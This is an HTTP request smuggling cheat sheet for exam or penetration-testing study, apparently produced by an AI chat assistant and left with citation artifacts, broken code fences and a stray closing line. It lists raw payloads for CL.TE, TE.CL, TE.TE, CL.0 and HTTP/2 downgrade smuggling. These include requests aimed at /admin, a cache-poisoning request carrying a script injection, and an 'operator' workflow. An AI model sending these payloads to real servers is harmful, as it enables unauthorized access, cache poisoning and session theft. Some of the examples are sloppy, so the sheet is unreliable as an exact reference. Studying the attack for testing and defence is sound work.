

---

``md
> [!ABSTRACT]
> HTTP Request Smuggling is a vulnerability where attackers exploit differences in how **front-end (proxy/load balancer)** and **back-end servers** interpret HTTP requests. :contentReference[oaicite:0]{index=0}  
> 
> It happens when:
> - Multiple servers parse requests differently  
> - Conflicting headers (`Content-Length` vs `Transfer-Encoding`) exist  
> - Request boundaries become ambiguous  
> 
> This allows attackers to **smuggle a hidden request inside another request**, causing desynchronization between servers. :contentReference[oaicite:1]{index=1}  
> 
> Impact:
> - Bypass security controls  
> - Hijack sessions / access other users’ requests  
> - Cache poisoning / data leakage  
> 
> 🧠 Think: “Front-end sees one request, back-end sees two”

---

## 🧠 HTTP Request Smuggling – Cheat Sheet

---

### 🎯 1. Basic Detection (CL.TE)

> [!CHECK]
> Test mismatch between `Content-Length` and `Transfer-Encoding`  

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

G
````

---

### 🧪 2. TE.CL Variant

> [!CHECK]  
> Reverse parsing logic between servers

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

5
HELLO
0
```

---

### 🧬 3. TE.TE (Header Obfuscation)

> [!ATTENTION]  
> Obfuscate Transfer-Encoding header

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: xchunked
Transfer-Encoding: chunked

0

G
```

---

### 🧩 4. Basic Smuggled Request

> [!SUCCESS]  
> Inject hidden request after first one

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6

GET /admin HTTP/1.1
Host: target.com
```

---

### 🧪 5. Cache Poisoning via Smuggling

> [!SUCCESS]  
> Poison cache with malicious request

```http
GET / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

0

GET /?q=<script>alert(1)</script> HTTP/1.1
Host: target.com
```

---

### 💥 6. Session Hijacking / Request Queue Poisoning

> [!SUCCESS]  
> Inject request into another user’s request

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 50

GET /my-account HTTP/1.1
Host: target.com
```

---

### ⚙️ 7. Bypass Filters / WAF

> [!ATTENTION]  
> Smuggle request past front-end validation

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

0

POST /admin HTTP/1.1
Host: target.com
```

---

### 🧪 8. HTTP/2 Downgrade Smuggling

> [!ATTENTION]  
> Exploit HTTP/2 → HTTP/1 conversion

```http
POST / HTTP/2
Host: target.com
Content-Length: 0

G
```

---

### 💣 9. CL.0 Variant

> [!ATTENTION]  
> Backend ignores Content-Length

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 0

GET /admin HTTP/1.1
Host: target.com
```

---

### 🔍 10. Real Workflow (Operator Method)

> [!SUCCESS]

1. Identify proxy architecture
    
2. Test CL.TE:
    

```http
Content-Length + Transfer-Encoding
```

3. Try TE.CL:
    

```http
Transfer-Encoding + Content-Length
```

4. Inject smuggled request:
    

```http
GET /admin
```

5. Observe:
    

- Unexpected responses
    
- Cached behavior
    
- Other user data
    

---

### 🧠 11. Where to Test

> [!ABSTRACT]

- Apps behind reverse proxies
    
- Load balancers / CDNs
    
- API gateways
    
- HTTP/1.1 systems
    

---

## 🔥 Minimal Payload Set (EXAM USE)

> [!SUCCESS]  
> If you remember nothing else

```bash
Content-Length: 13
Transfer-Encoding: chunked

0

G

Transfer-Encoding: chunked
Content-Length: 4

5
HELLO
0

GET /admin HTTP/1.1
Host: target.com
```

---

## ⚠️ Operator Notes

> [!FAILURE]  
> If nothing happens:
> 
> - No proxy / single server
>     
> - Requests normalized
>     
> - HTTP/2 only
>     

---

> [!ATTENTION]  
> Request smuggling requires:
> 
> - Front-end + back-end mismatch
>     
> - Conflicting headers
>     
> 
> No mismatch → no vulnerability

---

```

---

## 🔥 Key Insight (VERY IMPORTANT for you)

- This is an **advanced vuln**  
- Not about payloads → about:
  - **Protocol confusion**
  - **Server desync**
- Very powerful because:
  - You can affect **other users’ requests**

👉 Always think:
**“Can I make the server misread where the request ends?”**

---



Just say 🚀
::contentReference[oaicite:2]{index=2}
```